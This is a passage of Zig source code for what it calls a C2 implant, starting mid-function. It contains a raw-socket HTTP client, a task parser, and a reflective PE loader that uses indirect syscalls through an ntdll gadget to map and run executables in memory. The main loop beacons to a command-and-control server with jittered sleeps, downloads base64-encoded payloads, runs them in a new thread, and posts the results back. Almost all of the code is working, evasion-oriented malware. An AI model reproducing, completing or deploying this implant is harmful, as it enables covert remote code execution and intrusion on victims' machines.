    
    const sock = socket_fn(2, 1, 0); 
    if (sock == ~@as(usize, 0)) return error.SocketCreationFailed;
    defer _ = closesocket_fn(sock);
    
    const server_addr = SOCKADDR_IN{
        .sin_family = 2, 
        .sin_port = htons(port_num),
        .sin_addr = inet_addr(@ptrCast(&host_z)),
        .sin_zero = [_]u8{0} ** 8,
    };
    
    if (connect_fn(sock, &server_addr, @sizeOf(SOCKADDR_IN)) != 0) {
        return error.ConnectionFailed;
    }
    
    var request = std.ArrayList(u8).init(allocator);
    defer request.deinit();
    
    try request.writer().print(
        "GET {s} HTTP/1.1\r\n" ++
        "Host: {s}:{s}\r\n" ++
        "Connection: close\r\n" ++
        "\r\n",
        .{ path, host, port }
    );
    
    var sent: usize = 0;
    while (sent < request.items.len) {
        const n = send_fn(sock, request.items.ptr + sent, @intCast(request.items.len - sent), 0);
        if (n <= 0) return error.SendFailed;
        sent += @intCast(n);
    }
    
    var response = std.ArrayList(u8).init(allocator);
    defer response.deinit();
    
    var buf: [4096]u8 = undefined;
    while (true) {
        const n = recv_fn(sock, &buf, buf.len, 0);
        if (n <= 0) break;
        try response.appendSlice(buf[0..@intCast(n)]);
    }
    
    const response_str = response.items;
    if (std.mem.indexOf(u8, response_str, "\r\n\r\n")) |body_start| {
        const body_content = response_str[body_start + 4..];
        return allocator.dupe(u8, body_content);
    }
    
    return allocator.dupe(u8, "");
}
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// JSON PARSING & UTILITY
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn escapeJson(allocator: std.mem.Allocator, input: []const u8) ![]u8 {
    var output = std.ArrayList(u8).init(allocator);
    defer output.deinit();

    for (input) |c| {
        switch (c) {
            '"' => try output.appendSlice("\\\""),
            '\\' => try output.appendSlice("\\\\"),
            '\n' => try output.appendSlice("\\n"),
            '\r' => try output.appendSlice("\\r"),
            '\t' => try output.appendSlice("\\t"),
            else => try output.append(c),
        }
    }

    return output.toOwnedSlice();
}

fn parseTasksSimple(allocator: std.mem.Allocator, json: []const u8) !std.ArrayList(Task) {
    var tasks = std.ArrayList(Task).init(allocator);

    const tasks_start = std.mem.indexOf(u8, json, "\"tasks\":[") orelse return tasks;
    var pos = tasks_start + 9;

    while (pos < json.len) {
        while (pos < json.len and (json[pos] == ' ' or json[pos] == '\n' or json[pos] == '\r' or json[pos] == '\t')) : (pos += 1) {}
        
        if (pos >= json.len or json[pos] == ']') break;
        if (json[pos] == ',') {
            pos += 1;
            continue;
        }
        if (json[pos] != '{') break;

        var task = Task{
            .task_id = "",
            .command = "",
            .args = "",
        };

        const obj_start = pos;
        var obj_end = obj_start;
        var brace_count: i32 = 0;
        
        while (obj_end < json.len) {
            if (json[obj_end] == '{') brace_count += 1;
            if (json[obj_end] == '}') {
                brace_count -= 1;
                if (brace_count == 0) break;
            }
            obj_end += 1;
        }

        const obj = json[obj_start..obj_end + 1];

        if (extractJsonString(obj, "task_id")) |val| {
            task.task_id = try allocator.dupe(u8, val);
        }
        if (extractJsonString(obj, "command")) |val| {
            task.command = try allocator.dupe(u8, val);
        }
        if (extractJsonArray(allocator, obj, "args")) |val| {
            task.args = val;
        } else |_| {
            task.args = try allocator.dupe(u8, "");
        }

        try tasks.append(task);
        pos = obj_end + 1;
    }

    return tasks;
}

fn extractJsonString(json: []const u8, key: []const u8) ?[]const u8 {
    var search_buf: [256]u8 = undefined;
    const search_key = std.fmt.bufPrint(&search_buf, "\"{s}\":", .{key}) catch return null;
    
    const start = std.mem.indexOf(u8, json, search_key) orelse return null;
    var pos = start + search_key.len;

    while (pos < json.len and (json[pos] == ' ' or json[pos] == '\t' or json[pos] == '\n' or json[pos] == '\r')) : (pos += 1) {}
    
    if (pos >= json.len or json[pos] != '"') return null;
    pos += 1;

    const val_start = pos;
    while (pos < json.len and json[pos] != '"') : (pos += 1) {
        if (json[pos] == '\\') pos += 1;
    }

    return json[val_start..pos];
}

fn extractJsonArray(allocator: std.mem.Allocator, json: []const u8, key: []const u8) ![]const u8 {
    var search_buf: [256]u8 = undefined;
    const search_key = std.fmt.bufPrint(&search_buf, "\"{s}\":", .{key}) catch return error.ParseError;
    
    const start = std.mem.indexOf(u8, json, search_key) orelse return error.ParseError;
    var pos = start + search_key.len;

    while (pos < json.len and (json[pos] == ' ' or json[pos] == '\t' or json[pos] == '\n' or json[pos] == '\r')) : (pos += 1) {}
    
    if (pos >= json.len or json[pos] != '[') return error.ParseError;
    pos += 1;

    var result = std.ArrayList(u8).init(allocator);
    defer result.deinit();

    var first = true;
    while (pos < json.len) {
        while (pos < json.len and (json[pos] == ' ' or json[pos] == '\t' or json[pos] == '\n' or json[pos] == '\r')) : (pos += 1) {}
        
        if (pos >= json.len) break;
        if (json[pos] == ']') break;
        if (json[pos] == ',') {
            pos += 1;
            continue;
        }

        if (json[pos] == '"') {
            pos += 1;
            const val_start = pos;
            while (pos < json.len and json[pos] != '"') : (pos += 1) {
                if (json[pos] == '\\') pos += 1;
            }
            
            if (!first) {
                try result.append(' ');
            }
            try result.appendSlice(json[val_start..pos]);
            first = false;
            
            if (pos < json.len) pos += 1;
        } else {
            pos += 1;
        }
    }

    return result.toOwnedSlice();
}

const Task = struct {
    task_id: []const u8,
    command: []const u8,
    args: []const u8,
};

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// REFLECTIVE PE LOADER
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn reflective_load(allocator: std.mem.Allocator, module_bytes: []u8, gadget: *anyopaque) ![]const u8 {
    const CURRENT_PROCESS: isize = -1;

    const dos = @as(*IMAGE_DOS_HEADER, @ptrCast(@alignCast(module_bytes.ptr)));
    if (dos.e_magic != 0x5A4D) return error.InvalidDOS;

    const nt = @as(*IMAGE_NT_HEADERS64, @ptrFromInt(@intFromPtr(dos) + @as(usize, @intCast(dos.e_lfanew))));
    if (nt.Signature != 0x00004550) return error.InvalidPE;

     const old_base: ?*anyopaque = @ptrFromInt(nt.OptionalHeader.ImageBase);
     _ = nt_unmap_view_of_section_indirect(
        @ptrFromInt(@as(usize, @bitCast(CURRENT_PROCESS))),
        old_base,
        gadget,
    );

   if (previous_section_handle) |old_handle| {
       
    const close = nt_close(
        old_handle,
        gadget,
    );

    const close_status: u32 = @bitCast(close);
    if (close_status != 0) {
        std.debug.print("Failed to close handle with NTSTATUS: 0x{x}\n", .{close_status});
        return error.closehandlefailed;
    }
        previous_section_handle = null;
    }


    const sections = @as([*]IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(&nt.OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader));

    const tls_dir = nt.OptionalHeader.DataDirectory[9];
    if (tls_dir.VirtualAddress != 0 and tls_dir.Size != 0) {
        return error.TLSNotSupported; // Implement TLS support later for payloads
    }

    if (nt.OptionalHeader.Subsystem == 2) {
        return error.GUINotSupported; // dont know if i need to add GUI support yet...
    }

    var section_handle: ?*anyopaque = null;
    var region_size: usize = nt.OptionalHeader.SizeOfImage;

    const create_status = nt_create_section_indirect(
        &section_handle,
        0xF001F,
        null,
        &region_size,
        0x40,
        0x08000000,
        null,
        gadget,
    );

    if (create_status != 0) {
        return error.SectionCreationFailed;
    }

    var base_addr: ?*anyopaque = @ptrFromInt(nt.OptionalHeader.ImageBase);
    var view_size: usize = 0;

    var status = nt_map_view_of_section_indirect(
        section_handle,
        @ptrFromInt(@as(usize, @bitCast(CURRENT_PROCESS))), 
        &base_addr,
        0,
        0,
        null,
        &view_size,
        2,
        0,
        0x40,
        gadget,
    );

    if (status != 0) {
        base_addr = null;
        view_size = 0;
        status = nt_map_view_of_section_indirect(
            section_handle,
            @ptrFromInt(@as(usize, @bitCast(CURRENT_PROCESS))),
            &base_addr,
            0,
            0,
            null,
            &view_size,
            2,
            0,
            0x04,
            gadget,
        );
        if (status != 0) {
            return error.MapViewFailed;
        }
    }

    const final_base = base_addr.?;
    const dest = @as([*]u8, @ptrCast(final_base));

    @memcpy(dest[0..nt.OptionalHeader.SizeOfHeaders], module_bytes[0..nt.OptionalHeader.SizeOfHeaders]);

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const section = sections[i];
        if (section.SizeOfRawData == 0) continue;
        const src = module_bytes[section.PointerToRawData..][0..section.SizeOfRawData];
        const dst = dest[section.VirtualAddress..][0..section.SizeOfRawData];
        @memcpy(dst, src);
    }

    const loaded_nt = @as(*IMAGE_NT_HEADERS64, @ptrFromInt(@intFromPtr(dest) + @as(usize, @intCast(dos.e_lfanew))));

    const actual_base = @intFromPtr(final_base);
    const preferred_base = nt.OptionalHeader.ImageBase;

    if (actual_base != preferred_base) {
        const reloc_dir = loaded_nt.OptionalHeader.DataDirectory[5];
        if (reloc_dir.VirtualAddress == 0 or reloc_dir.Size == 0) return error.NoRelocations;

        const delta = @as(i64, @intCast(actual_base)) - @as(i64, @intCast(preferred_base));
        var reloc_offset: usize = 0;

        while (reloc_offset < reloc_dir.Size) {
            const reloc_block = @as(*align(1) extern struct {
                VirtualAddress: u32,
                SizeOfBlock: u32,
            }, @ptrFromInt(@intFromPtr(dest) + reloc_dir.VirtualAddress + reloc_offset));

            if (reloc_block.SizeOfBlock == 0) break;

            const num_entries = (reloc_block.SizeOfBlock - 8) / 2;
            const entries = @as([*]u16, @ptrFromInt(@intFromPtr(reloc_block) + 8));

            for (0..num_entries) |j| {
                const entry = entries[j];
                const reloc_type = entry >> 12;
                const offset = entry & 0xFFF;

                if (reloc_type == 10) {
                    const target = @as(*u64, @ptrFromInt(@intFromPtr(dest) + reloc_block.VirtualAddress + offset));
                    target.* = @as(u64, @intCast(@as(i64, @intCast(target.*)) + delta));
                }
            }

            reloc_offset += reloc_block.SizeOfBlock;
        }
    }

    const import_dir = loaded_nt.OptionalHeader.DataDirectory[1];
    if (import_dir.VirtualAddress != 0 and import_dir.Size != 0) {
        const import_desc = @as([*]IMAGE_IMPORT_DESCRIPTOR, @ptrFromInt(@intFromPtr(dest) + import_dir.VirtualAddress));

        var desc_idx: usize = 0;
        while (import_desc[desc_idx].Name != 0) : (desc_idx += 1) {
            const dll_name_ptr = @as([*:0]u8, @ptrFromInt(@intFromPtr(dest) + import_desc[desc_idx].Name));
            const dll_name = std.mem.span(dll_name_ptr);

            var dll_name_wide: [256]u16 = undefined;
            for (dll_name, 0..) |c, idx| {
                dll_name_wide[idx] = c;
            }
            dll_name_wide[dll_name.len] = 0;

            const dll_base = findModule(dll_name_wide[0..dll_name.len]) orelse continue;

            const iat = @as([*]u64, @ptrFromInt(@intFromPtr(dest) + import_desc[desc_idx].FirstThunk));
            const ilt_rva = if (import_desc[desc_idx].OriginalFirstThunk != 0)
                import_desc[desc_idx].OriginalFirstThunk
            else
                import_desc[desc_idx].FirstThunk;
            const ilt = @as([*]u64, @ptrFromInt(@intFromPtr(dest) + ilt_rva));

            var func_idx: usize = 0;
            while (ilt[func_idx] != 0) : (func_idx += 1) {
                if (ilt[func_idx] & 0x8000000000000000 != 0) continue;

                const import_by_name = @as(*extern struct {
                    Hint: u16,
                    Name: [1]u8,
                }, @ptrFromInt(@intFromPtr(dest) + ilt[func_idx]));

                const func_name = std.mem.span(@as([*:0]u8, @ptrCast(&import_by_name.Name)));

                if (resolve_export(dll_base, func_name)) |addr| {
                    iat[func_idx] = @intFromPtr(addr);
                }
            }
        }
    }

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const section = sections[i];
        const characteristics = section.Characteristics;
        const is_executable = (characteristics & 0x20000000) != 0;
        const is_readable = (characteristics & 0x40000000) != 0;
        const is_writable = (characteristics & 0x80000000) != 0;

        var protect: u32 = 0x04;
        if (is_executable and is_readable and !is_writable) {
            protect = 0x20;
        } else if (!is_executable and is_readable and !is_writable) {
            protect = 0x02;
        }

        var section_base: ?*anyopaque = @ptrFromInt(@intFromPtr(dest) + section.VirtualAddress);
        var section_size: usize = section.Misc.VirtualSize;
        var old_protect: u32 = 0;

        status = nt_protect_virtual_memory_indirect(
            CURRENT_PROCESS, 
            &section_base, 
            &section_size, 
            protect, 
            &old_protect, 
            gadget
            );

        const nt_protect_virtual_memory_status: u32 = @bitCast(status);

        if (nt_protect_virtual_memory_status != 0) {
            std.debug.print("NtProtectVirtualMemory failed: 0x{x}\n", .{nt_protect_virtual_memory_status});
            return error.ProtectVirtualMemorFailed;
        }
    }

    const entry_point_addr = @intFromPtr(dest) + nt.OptionalHeader.AddressOfEntryPoint;
    
    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();
    
    try result.writer().print("PE loaded at 0x{x}, entry: 0x{x}", .{@intFromPtr(final_base), entry_point_addr});
    
    var thread_handle: ?*anyopaque = null;
    status = nt_create_thread_ex_indirect(
    &thread_handle,
    0x1FFFFF,
    null,
    @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))),
    @ptrFromInt(entry_point_addr),
    null,
    0,
    0, 0, 0,
    null,
    gadget,
    );

    const nt_create_thread_ex_status: i32 = @bitCast(status);

    if (nt_create_thread_ex_status != 0) {
        std.debug.print("NtCreateThreadEx failed: 0x{x}\n", .{nt_create_thread_ex_status});
        return error.ThreadCreationFailed;
    }

    status = nt_wait_for_single_object(
        thread_handle,
        0,
        null,
        gadget,
    );


const nt_wait_for_single_object_status: i32 = @bitCast(status);

if (nt_wait_for_single_object_status != 0) {
    std.debug.print("[!] NtWaitForSingleObject failed: 0x{x}\n", .{nt_wait_for_single_object_status});
    return error.WaitingForThreadFailed;
} 

 previous_section_handle = section_handle;
    return result.toOwnedSlice();
}


// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// C2 IMPLANT LOGIC
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

var global_gadget: ?*anyopaque = null;
var previous_pe_base: ?*anyopaque = null;
var previous_section_handle: ?*anyopaque = null;

fn loadPeFromC2(allocator: std.mem.Allocator, c2_url: []const u8) ![]const u8 {
        if (global_gadget == null) {
        const ntdll_name = [_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
        const ntdll_base = findModule(&ntdll_name).?;
        global_gadget = find_syscall_gadget(ntdll_base);
        if (global_gadget == null) return error.NoSyscallGadget;
    }
    
    const url = try buildUrl(allocator, c2_url);
    defer allocator.free(url);

    const json_response = try sendHttpGet(allocator, url);
    defer allocator.free(json_response);

    const parsed = try std.json.parseFromSlice(std.json.Value, allocator, json_response, .{});
    defer parsed.deinit();

   const pe_base64 = parsed.value.object.get("pe").?.string;

    const decoder = std.base64.standard.Decoder;
    const decoder_size = try decoder.calcSizeForSlice(pe_base64);
    const pe_bytes = try allocator.alloc(u8, decoder_size);
    try decoder.decode(pe_bytes, pe_base64);

    return reflective_load(allocator, pe_bytes, global_gadget.?);
}

fn loadPEFromPath(allocator: std.mem.Allocator, path: []const u8) ![]const u8 {
    if (global_gadget == null) {
        const ntdll_name = [_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
        const ntdll_base = findModule(&ntdll_name).?;
        global_gadget = find_syscall_gadget(ntdll_base);
        if (global_gadget == null) return error.NoSyscallGadget;
    }
    
    std.debug.print("[*] Opening file: '{s}' (len: {})\n", .{path, path.len});
    
    const file = std.fs.cwd().openFile(path, .{}) catch |err| {
        std.debug.print("[!] Open failed: {}\n", .{err});
        return err;
    };
    defer file.close();

    const file_size = (try file.stat()).size;
    std.debug.print("[*] File size: {}\n", .{file_size});
    
    const module_bytes = try allocator.alloc(u8, file_size);
    defer allocator.free(module_bytes);

    _ = try file.readAll(module_bytes);

    return reflective_load(allocator, module_bytes, global_gadget.?);
}
    
fn submitResult(allocator: std.mem.Allocator, task_id: []const u8, output: []const u8) !void {
    const escaped = try escapeJson(allocator, output);
    defer allocator.free(escaped);

    var payload = std.ArrayList(u8).init(allocator);
    defer payload.deinit();

    try payload.writer().print(
        "{{\"task_id\":\"{s}\",\"output\":\"{s}\"}}",
        .{ task_id, escaped }
    );

    const results = try buildUrl(allocator, "/results");
    defer allocator.free(results);
    const response = try sendHttpPost(allocator, results , payload.items);
    defer allocator.free(response);
}

fn checkin(allocator: std.mem.Allocator) !void {
    std.debug.print("[*] Checking in...\n", .{});
    
    const payload = 
        \\{"implant_id":"agent_001","hostname":"InfectedPC","username":"Mirai","os_info":"Windows 11"}
    ;
    const check_in = try buildUrl(allocator, "/checkin");
    defer allocator.free(check_in);
    const body = try sendHttpPost(allocator, check_in, payload);
    defer allocator.free(body);
    
    std.debug.print("[+] Received: {s}\n", .{body});

    const tasks = try parseTasksSimple(allocator, body);
    defer {
        for (tasks.items) |task| {
            allocator.free(task.task_id);
            allocator.free(task.command);
            allocator.free(task.args);
        }
        tasks.deinit();
    }

for (tasks.items) |task| {
    std.debug.print("[+] Executing: {s} {s}\n", .{task.command, task.args});
    
    const result = if (std.mem.eql(u8, task.command, "load_pe")) blk: {
        const path = try unescapePath(allocator, task.args);
        defer allocator.free(path);
        
        std.debug.print("[+] Loading PE from disk: {s}\n", .{path});
        break :blk loadPEFromPath(allocator, path) catch |err| {
            const err_msg = try std.fmt.allocPrint(allocator, "PE load failed: {}", .{err});
            std.debug.print("[!] {s}\n", .{err_msg});
            break :blk err_msg;
        };
        
    } else if (std.mem.eql(u8, task.command, "load_pe_remote")) blk: {
          const filename = task.args; // This is "main.exe"
    const path = try std.fmt.allocPrint(allocator, "/payload/{s}", .{filename});
    defer allocator.free(path);

        std.debug.print("[+] Loading PE from C2: {s}\n", .{path});
        break :blk loadPeFromC2(allocator, path) catch |err| {
            const err_msg = try std.fmt.allocPrint(allocator, "Remote PE load failed: {}", .{err});
            std.debug.print("[!] {s}\n", .{err_msg});
            break :blk err_msg;
        };
        
    } else blk: {
        break :blk try allocator.dupe(u8, "Unknown command");
    };
    
    defer allocator.free(result);
    std.debug.print("[*] Result: {s}\n", .{result});
    submitResult(allocator, task.task_id, result) catch {};
}

}

pub fn main() !void {
    var buffer: [10 * 1024 * 1024]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buffer);
    var allocator = fba.allocator();

    // initialize Winsock
    try initWinsock();

    // initialize syscall gadget
    const ntdll_name = [_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
    const ntdll_base = findModule(&ntdll_name).?;
    global_gadget = find_syscall_gadget(ntdll_base);

    // simple PRNG for jitter
    var seed: u64 = undefined;
    _ = std.posix.getrandom(std.mem.asBytes(&seed)) catch {
        seed = 12345; // fallback seed
    };
    var prng = std.rand.DefaultPrng.init(seed);
    const rand = prng.random();

    while (true) {
         fba = std.heap.FixedBufferAllocator.init(&buffer);
         allocator = fba.allocator();

        checkin(allocator) catch {};
        
        const sleep_sec = rand.intRangeAtMost(u64, 3, 10);
        std.time.sleep(sleep_sec * std.time.ns_per_s);
    }
}